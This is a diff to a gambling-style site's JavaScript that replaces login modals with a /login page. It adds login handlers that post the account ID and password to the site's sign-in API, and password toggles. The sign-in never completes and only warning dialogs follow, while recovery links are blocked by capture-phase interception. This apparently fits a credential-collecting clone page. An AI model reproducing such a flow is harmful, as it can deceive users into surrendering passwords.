@@ -762,9 +762,9 @@ window.navigateTo = function(url) {
       } else if (bottomNavLi.classList.contains('nav-promo')) {
         window.navigateTo('/promotions');
       } else if (bottomNavLi.classList.contains('nav-deposit')) {
-        showLoginModal();
+        window.navigateTo('/login');
       } else if (bottomNavLi.classList.contains('nav-withdrawal')) {
-        showLoginModal();
+        window.navigateTo('/login');
       } else if (bottomNavLi.classList.contains('nav-cs')) {
         const csLink = document.querySelector('#shortcut_PConlinecs a');
         if (csLink && csLink.href) {
@@ -773,7 +773,7 @@ window.navigateTo = function(url) {
           showWarningDialog('/');
         }
       } else if (bottomNavLi.classList.contains('nav-account')) {
-        showLoginModal();
+        window.navigateTo('/login');
       }
       return;
     }
@@ -829,12 +829,193 @@ window.navigateTo = function(url) {
       return;
     }
 
-    // 3. Header login buttons click triggers login modal
+    // 3. Header login buttons click redirects to login page
     const loginLink = e.target.closest('a[href="/login"], #login-btn');
     if (loginLink) {
       e.preventDefault();
       e.stopPropagation();
-      showLoginModal();
+      window.navigateTo('/login');
+      return;
+    }
+
+    // 4. Mobile login page form submission handler
+    const loginSubmitBtn = e.target.closest('#login-submit-btn');
+    if (loginSubmitBtn) {
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      
+      const usernameInput = document.getElementById('login');
+      const passwordInput = document.getElementById('password');
+      if (!usernameInput || !passwordInput) return;
+      
+      let isValid = true;
+      const showError = (inputEl, msg) => {
+        const group = inputEl.closest('.form-group');
+        if (group) {
+          group.classList.add('has-error');
+          let errEl = group.querySelector('.error-text');
+          if (!errEl) {
+            errEl = document.createElement('small');
+            errEl.className = 'error-text';
+            group.appendChild(errEl);
+          }
+          errEl.innerText = msg;
+        }
+        isValid = false;
+      };
+      
+      document.querySelectorAll('.form-group.has-error').forEach(g => {
+        g.classList.remove('has-error');
+        const errEl = g.querySelector('.error-text');
+        if (errEl) errEl.remove();
+      });
+      
+      if (!usernameInput.value.trim()) {
+        showError(usernameInput, 'Bắt buộc nhập');
+      }
+      if (!passwordInput.value.trim()) {
+        showError(passwordInput, 'Bắt buộc nhập');
+      }
+      
+      if (!isValid) return;
+      
+      const payload = {
+        AccountID: usernameInput.value.trim(),
+        AccountPWD: passwordInput.value
+      };
+      
+      try {
+        fetch('/api/Authorize/SignIn', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        })
+        .then(res => res.json())
+        .then(result => {
+          if (result.Error) {
+            showWarningDialog(result.Error.Redirect);
+          }
+        })
+        .catch(() => {
+          showWarningDialog('/');
+        });
+      } catch (err) {
+        showWarningDialog('/');
+      }
+      return;
+    }
+
+    // 5. Mobile login password visibility toggle
+    const togglePwdBtn = e.target.closest('#toggle-pwd-btn');
+    if (togglePwdBtn) {
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      const input = document.getElementById('password');
+      const eyeIcon = togglePwdBtn;
+      if (input && eyeIcon) {
+        if (input.type === 'password') {
+          input.type = 'text';
+          eyeIcon.className = 'mps-readable';
+        } else {
+          input.type = 'password';
+          eyeIcon.className = 'mps-unreadable';
+        }
+      }
+      return;
+    }
+
+    // 6. Desktop login page form submission handler
+    const deskLoginSubmitBtn = e.target.closest('#desk-login-submit-btn');
+    if (deskLoginSubmitBtn) {
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      
+      const usernameInput = document.getElementById('desk-login-username');
+      const passwordInput = document.getElementById('desk-login-password');
+      if (!usernameInput || !passwordInput) return;
+      
+      let isValid = true;
+      const showError = (inputEl, msg) => {
+        const group = inputEl.closest('.desktop-login-field');
+        if (group) {
+          group.classList.add('has-error');
+          let errEl = group.querySelector('.error-text');
+          if (!errEl) {
+            errEl = document.createElement('small');
+            errEl.className = 'error-text';
+            group.appendChild(errEl);
+          }
+          errEl.innerText = msg;
+        }
+        isValid = false;
+      };
+      
+      document.querySelectorAll('.desktop-login-field.has-error').forEach(g => {
+        g.classList.remove('has-error');
+        const errEl = g.querySelector('.error-text');
+        if (errEl) errEl.remove();
+      });
+      
+      if (!usernameInput.value.trim()) {
+        showError(usernameInput, 'Bắt buộc nhập');
+      }
+      if (!passwordInput.value.trim()) {
+        showError(passwordInput, 'Bắt buộc nhập');
+      }
+      
+      if (!isValid) return;
+      
+      const payload = {
+        AccountID: usernameInput.value.trim(),
+        AccountPWD: passwordInput.value
+      };
+      
+      try {
+        fetch('/api/Authorize/SignIn', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        })
+        .then(res => res.json())
+        .then(result => {
+          if (result.Error) {
+            showWarningDialog(result.Error.Redirect);
+          }
+        })
+        .catch(() => {
+          showWarningDialog('/');
+        });
+      } catch (err) {
+        showWarningDialog('/');
+      }
+      return;
+    }
+
+    // 7. Desktop login password visibility toggle
+    const deskTogglePwdBtn = e.target.closest('#desk-toggle-pwd-btn');
+    if (deskTogglePwdBtn) {
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      const input = document.getElementById('desk-login-password');
+      const eyeIcon = deskTogglePwdBtn.querySelector('i');
+      if (input && eyeIcon) {
+        if (input.type === 'password') {
+          input.type = 'text';
+          eyeIcon.className = 'mps-readable';
+        } else {
+          input.type = 'password';
+          eyeIcon.className = 'mps-unreadable';
+        }
+      }
+      return;
+    }
+
+    // 8. General recovery link clicks to display warning modal
+    const recoveryLink = e.target.closest('.recovery-links a, .desktop-forget-options a');
+    if (recoveryLink) {
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      showWarningDialog('/');
       return;
     }
   }, true); // Use capture phase to intercept routing clicks!
